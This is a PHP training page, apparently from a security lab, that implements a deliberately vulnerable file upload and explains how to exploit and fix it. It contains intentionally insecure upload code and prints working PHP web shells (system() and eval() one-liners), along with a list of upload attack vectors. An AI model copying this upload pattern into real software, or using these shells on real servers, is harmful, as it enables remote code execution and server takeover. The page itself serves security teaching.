<?php
// VULNERABLE FILE UPLOAD PAGE
// WARNING: FOR TRAINING PURPOSES ONLY - DO NOT USE IN PRODUCTION

session_start();
include("config-vulnerable.php");

// Vulnerable: Display all errors
error_reporting(E_ALL);
ini_set('display_errors', 1);

$upload_message = "";
$uploaded_files = array();

// Create uploads directory if it doesn't exist
$upload_dir = "uploads/";
if(!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

if(isset($_POST['upload'])) {
    // VULNERABILITY #1: No file type validation
    // VULNERABILITY #2: No file size check
    // VULNERABILITY #3: Using original filename without sanitization
    
    $target_file = $upload_dir . basename($_FILES["fileToUpload"]["name"]);
    
    // VULNERABILITY #4: No file content verification
    // VULNERABILITY #5: Executable permissions on upload directory
    
    if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $upload_message = "SUCCESS: File uploaded to " . $target_file;
        // VULNERABILITY #6: Displaying direct path to uploaded file
        $upload_message .= "<br><a href='" . $target_file . "' target='_blank'>View/Execute uploaded file</a>";
    } else {
        $upload_message = "ERROR: File upload failed - " . $_FILES["fileToUpload"]["error"];
    }
}

// List uploaded files
if(is_dir($upload_dir)) {
    $files = scandir($upload_dir);
    foreach($files as $file) {
        if($file != "." && $file != "..") {
            $uploaded_files[] = $file;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Vulnerable File Upload - Training</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        .warning-banner {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .vulnerability-info {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .file-list {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        ⚠️ VULNERABLE VERSION - FOR SECURITY TRAINING ONLY ⚠️
    </div>
    
    <div class="container">
        <div class="row">
            <div class="col-md-10 offset-md-1">
                <div class="vulnerability-info">
                    <h5>🎯 Training Target: Unrestricted File Upload</h5>
                    <p><strong>Vulnerabilities Present:</strong></p>
                    <ul>
                        <li>No file type/extension validation</li>
                        <li>No file size restrictions</li>
                        <li>No MIME type verification</li>
                        <li>No content inspection</li>
                        <li>Files stored in web-accessible directory</li>
                        <li>Original filename used without sanitization</li>
                        <li>No authentication required</li>
                    </ul>
                    <p><strong>Try:</strong> Upload a PHP web shell (shell.php)</p>
                </div>

                <div class="card mb-4">
                    <div class="card-header">
                        <h3>File Upload (Vulnerable)</h3>
                    </div>
                    <div class="card-body">
                        <?php if(!empty($upload_message)): ?>
                            <div class="alert alert-info">
                                <?php echo $upload_message; ?>
                            </div>
                        <?php endif; ?>
                        
                        <form method="post" enctype="multipart/form-data">
                            <div class="form-group">
                                <label>Select file to upload:</label>
                                <input type="file" class="form-control-file" name="fileToUpload">
                                <small class="form-text text-muted">
                                    Any file type allowed! Try uploading a PHP shell.
                                </small>
                            </div>
                            
                            <button type="submit" name="upload" class="btn btn-primary">
                                Upload File
                            </button>
                        </form>
                    </div>
                </div>

                <?php if(count($uploaded_files) > 0): ?>
                    <div class="card mb-4">
                        <div class="card-header">
                            <h5>Uploaded Files (Directly Accessible!)</h5>
                        </div>
                        <div class="card-body">
                            <div class="file-list">
                                <ul>
                                    <?php foreach($uploaded_files as $file): ?>
                                        <li>
                                            <a href="<?php echo $upload_dir . $file; ?>" target="_blank">
                                                <?php echo htmlspecialchars($file); ?>
                                            </a>
                                            <small>(Click to execute/view)</small>
                                        </li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>

                <div class="vulnerability-info">
                    <h6>💡 Learning Points:</h6>
                    <ol>
                        <li>No validation of file extensions or types</li>
                        <li>Files can be directly accessed via URL</li>
                        <li>PHP files will be executed by the server</li>
                        <li>No authentication or authorization checks</li>
                        <li>Directory listing might be possible</li>
                    </ol>
                    
                    <h6>🔍 Creating a PHP Web Shell:</h6>
                    <p>Create a file named <code>shell.php</code> with this content:</p>
                    <pre>&lt;?php
// Simple web shell
if(isset($_GET['cmd'])) {
    echo "&lt;pre&gt;";
    system($_GET['cmd']);
    echo "&lt;/pre&gt;";
}
?&gt;
&lt;form method="get"&gt;
    Command: &lt;input type="text" name="cmd"&gt;
    &lt;input type="submit" value="Execute"&gt;
&lt;/form&gt;</pre>
                    
                    <p>After uploading, access: <code>uploads/shell.php?cmd=whoami</code></p>
                    
                    <h6>🎯 Other Attack Vectors:</h6>
                    <pre>1. PHP Web Shell: Complete remote code execution
2. .htaccess Upload: Change Apache configuration
3. Image with embedded PHP: Bypass weak filters
4. Zip Bomb: Denial of service
5. HTML/JavaScript: XSS via uploaded file
6. SVG with XSS: XSS in image files
7. Path Traversal: ../../../etc/passwd overwrite</pre>
                    
                    <h6>🛡️ How to Fix:</h6>
                    <pre>1. Whitelist allowed file extensions
   $allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
   $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
   if(!in_array($ext, $allowed)) die("Invalid file type");

2. Verify MIME type
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $tmp_name);
   if(!in_array($mime, $allowed_mimes)) die("Invalid MIME");

3. Limit file size
   if($_FILES['file']['size'] > 2000000) die("File too large");

4. Rename files (remove original name)
   $new_name = uniqid() . '.' . $ext;

5. Store outside web root or block execution
   - Store in /var/uploads (not web accessible)
   - Use .htaccess to prevent execution:
     &lt;FilesMatch "\.php$"&gt;
         Order Allow,Deny
         Deny from all
     &lt;/FilesMatch&gt;

6. Validate file content (not just extension)
   - Use getimagesize() for images
   - Scan with antivirus

7. Require authentication and authorization</pre>
                </div>

                <div class="vulnerability-info mt-3">
                    <h6>⚠️ Real-World Impact:</h6>
                    <ul>
                        <li><strong>Remote Code Execution:</strong> Full server compromise via web shell</li>
                        <li><strong>Data Breach:</strong> Access to sensitive files and databases</li>
                        <li><strong>Malware Distribution:</strong> Host malicious files</li>
                        <li><strong>Defacement:</strong> Replace website content</li>
                        <li><strong>DoS Attack:</strong> Fill disk space with large files</li>
                        <li><strong>Phishing:</strong> Host phishing pages</li>
                        <li><strong>Backdoor:</strong> Persistent access mechanism</li>
                    </ul>
                </div>

                <div class="vulnerability-info mt-3">
                    <h6>📝 Example Web Shells:</h6>
                    <p><strong>Minimal PHP Shell:</strong></p>
                    <pre>&lt;?php system($_GET['c']); ?&gt;</pre>
                    
                    <p><strong>One-liner Shell:</strong></p>
                    <pre>&lt;?php @eval($_POST['x']); ?&gt;</pre>
                    
                    <p><strong>Hidden in Image Comment:</strong></p>
                    <pre>1. Create legitimate image.jpg
2. Add PHP code in comment metadata
3. Rename to image.php.jpg or image.jpg.php
4. Some servers may execute PHP</pre>
                </div>

                <div class="mt-3">
                    <a href="user-login-sqli.php">← Back to Login</a> | 
                    <a href="command-injection.php">Command Injection →</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
